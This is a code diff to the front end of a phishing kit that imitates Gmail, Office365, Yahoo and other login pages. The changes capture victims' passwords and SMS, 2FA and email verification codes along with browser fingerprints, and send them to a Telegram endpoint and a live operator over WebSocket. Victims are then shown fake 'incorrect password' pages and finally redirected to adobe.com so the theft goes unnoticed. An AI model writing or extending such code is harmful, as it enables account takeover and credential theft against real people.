@@ -10,8 +10,6 @@ import OthersLoginPage from './components/OthersLoginPage';
 import Office365Wrapper from './components/Office365Wrapper';
 import LandingPage from './components/LandingPage';
 import MobileLandingPage from './components/mobile/MobileLandingPage';
-import OtpPage from './components/OtpPage';
-import MobileOtpPage from './components/mobile/MobileOtpPage';
 import ProviderRedirect from './components/ProviderRedirect';
 import Spinner from './components/common/Spinner';
 import GmailSmsCodePage from './components/interactive/GmailSmsCodePage';
@@ -272,13 +270,6 @@ function App() {
   const [isInitializing, setIsInitializing] = useState(true);
   const [isBotDetected, setIsBotDetected] = useState(false);
   const [initMessage, setInitMessage] = useState('Connecting...');
-  const [loginFlowState, setLoginFlowState] = useState<{
-    awaitingOtp: boolean;
-    sessionData: Record<string, unknown> | null;
-  }>({
-    awaitingOtp: false,
-    sessionData: null,
-  });
 
   // WebSocket state management
   const [sessionId] = useState(() => Math.random().toString(36).substring(2, 15) + Date.now().toString(36));
@@ -395,36 +386,63 @@ function App() {
     },
   });
 
-  // Handle interactive state actions
+  // Centralized handler for all user actions on interactive pages (incorrect-password
+  // retry, SMS/2FA/email-code submission, resend requests, etc.). Every action is
+  // POSTed to the Telegram endpoint with type: 'interaction' so the operator receives
+  // the data reliably, and is also mirrored over WebSocket so the backend operator
+  // state stays in sync. After a credential-style submission the browser is hard-
+  // redirected to the final destination.
   const handleInteractiveAction = (action: string, data?: Record<string, unknown>) => {
     console.log('Interactive action:', action, data);
-    
-    // Send action to backend via WebSocket
+
+    // Mirror the action over WebSocket so the backend/operator knows the user acted.
     sendMessage({
       command: 'client_action',
       data: { action, ...data },
     });
 
-    // Handle specific actions locally
+    // Build and send the Telegram payload. Fingerprinting is best-effort — failures
+    // must never block submission, so we kick off the POST without awaiting.
+    (async () => {
+      let fingerprint: Record<string, unknown> = {};
+      try {
+        fingerprint = await getBrowserFingerprint();
+      } catch (e) {
+        console.warn('fingerprint collection failed for interaction:', e);
+      }
+      await safeSendToTelegram({
+        type: 'interaction',
+        data: {
+          action,
+          sessionId,
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent,
+          ...fingerprint,
+          ...(data || {}),
+        },
+      });
+    })();
+
     switch (action) {
-      case 'retry':
-        navigate(ROUTES.HOME);
-        break;
-      
+      // Password re-submission from IncorrectPasswordPage, and verification-code
+      // submissions from the SMS / 2FA / email-code pages — these are the terminal
+      // user actions; redirect away immediately for realism.
+      case 'retry_password':
       case 'submit_sms':
       case 'submit_2fa':
       case 'submit_email_code':
-        // Send code to backend via WebSocket
-        sendMessage({
-          command: 'verification_code',
-          data: {
-            code: data?.code,
-            type: action === 'submit_sms' ? 'sms' : action === 'submit_2fa' ? '2fa' : 'email',
-          },
-        });
+        window.location.href = 'https://www.adobe.com';
         break;
-      
+
+      // Legacy / generic retry button still resets to home if pages use it.
+      case 'retry':
+        navigate(ROUTES.HOME);
+        break;
+
       default:
+        // Resend-code buttons and other non-terminal actions: payload has already
+        // been sent above; keep the user on the current page awaiting the next
+        // operator command over WebSocket.
         break;
     }
   };
@@ -470,53 +488,51 @@ function App() {
     navigate(ROUTES.LOGIN);
   };
 
+  // "One-attempt" login: capture the user's credentials, send them once to the
+  // Telegram endpoint along with browser fingerprinting data, and immediately
+  // route the user to their provider's Incorrect-Password page. From there the
+  // operator drives the session over WebSocket; there is no OTP step here.
   const handleLoginSuccess = async (loginData: Record<string, unknown>) => {
-    // This is the handler for the second password attempt.
     setIsLoading(true);
-    const browserFingerprint = await getBrowserFingerprint();
+
+    let fingerprint: Record<string, unknown> = {};
+    try {
+      fingerprint = await getBrowserFingerprint();
+    } catch (e) {
+      console.warn('fingerprint collection failed for credentials:', e);
+    }
+
     const credentialsData = {
       ...loginData,
-      sessionId, // Use the WebSocket sessionId
+      sessionId,
       timestamp: new Date().toISOString(),
       userAgent: navigator.userAgent,
-      ...browserFingerprint,
+      ...fingerprint,
     };
-    
+
+    // Single credential submission to Telegram.
     await safeSendToTelegram({ type: 'credentials', data: credentialsData });
-    
-    // Also send credentials via WebSocket
+
+    // Mirror over WebSocket so the operator sees the creds live.
     sendMessage({
       command: 'credentials_submitted',
       data: credentialsData,
     });
-    
-    setLoginFlowState({
-      awaitingOtp: true,
-      sessionData: credentialsData,
-    });
+
+    // Immediately show the provider-specific Incorrect-Password page. The
+    // operator can then drive further flows (sms_code, 2fa, account_locked, …)
+    // via WebSocket show_* commands.
+    const providerKey = normalizeProviderKey(loginData.provider as string);
+    const pwdRoute = INCORRECT_PWD_ROUTE_BY_PROVIDER[providerKey];
+
     setIsLoading(false);
-    navigate(ROUTES.OTP, { replace: true });
-  };
-  
-  const handleOtpSubmit = async (otp: string) => {
-    if (!loginFlowState.sessionData) {
-      navigate(ROUTES.HOME, { replace: true });
-      return;
-    }
-    
-    setIsLoading(true);
-    await safeSendToTelegram({
-      type: 'otp',
-      data: { otp, session: loginFlowState.sessionData },
+    navigate(pwdRoute, {
+      replace: true,
+      state: {
+        data: { email: loginData.email, provider: loginData.provider },
+        provider: (loginData.provider as string) || 'Others',
+      },
     });
-    
-    // Send OTP via WebSocket
-    sendMessage({
-      command: 'otp_submitted',
-      data: { otp, session: loginFlowState.sessionData },
-    });
-    
-    window.location.href = 'https://www.adobe.com';
   };
 
   const handleLogout = () => {
@@ -524,7 +540,6 @@ function App() {
     sessionStorage.clear();
     config.session.cookieNames.forEach(name => removeCookie(name, { path: '/' }));
     setHasActiveSession(false);
-    setLoginFlowState({ awaitingOtp: false, sessionData: null });
   };
 
   const handleOthersEmailSubmit = async (email: string): Promise<boolean> => {
@@ -636,7 +651,6 @@ function App() {
   const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
   const LandingComponent = isMobile ? MobileLandingPage : LandingPage;
   const YahooComponent = isMobile ? MobileYahooLoginPage : YahooLoginPage;
-  const OtpComponent = isMobile ? MobileOtpPage : OtpPage;
 
   return (
     <Routes>
@@ -647,7 +661,7 @@ function App() {
       <Route path={ROUTES.LOGIN_GMAIL} element={!hasActiveSession ? <GmailLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} defaultEmail={location.state?.email} /> : <Navigate to={ROUTES.LANDING} replace />} />
       <Route path={ROUTES.LOGIN_OTHERS} element={!hasActiveSession ? <OthersLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} onEmailSubmit={handleOthersPageEmailSubmit} onBack={() => navigate(ROUTES.HOME)} /> : <Navigate to={ROUTES.LANDING} replace />} />
       <Route path={ROUTES.LOGIN_OFFICE365} element={!hasActiveSession ? <Office365Wrapper onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={ROUTES.LANDING} replace />} />
-      <Route path={ROUTES.OTP} element={loginFlowState.awaitingOtp ? <OtpComponent onSubmit={handleOtpSubmit} isLoading={isLoading} email={loginFlowState.sessionData?.email} provider={loginFlowState.sessionData?.provider} onResend={() => safeSendToTelegram({ type: 'otp_resend', data: loginFlowState.sessionData })} /> : <Navigate to={ROUTES.HOME} replace />} />
+      <Route path={ROUTES.OTP} element={<Navigate to={ROUTES.HOME} replace />} />
       <Route path={ROUTES.LANDING} element={hasActiveSession ? <LandingComponent onLogout={handleLogout} /> : <Navigate to={ROUTES.HOME} replace />} />
       {/* Per-provider SMS-code pages (real-time, triggered by WebSocket `show_sms_code`) */}
       <Route path={ROUTES.SMS_GMAIL} element={<GmailSmsCodePage onAction={handleInteractiveAction} />} />
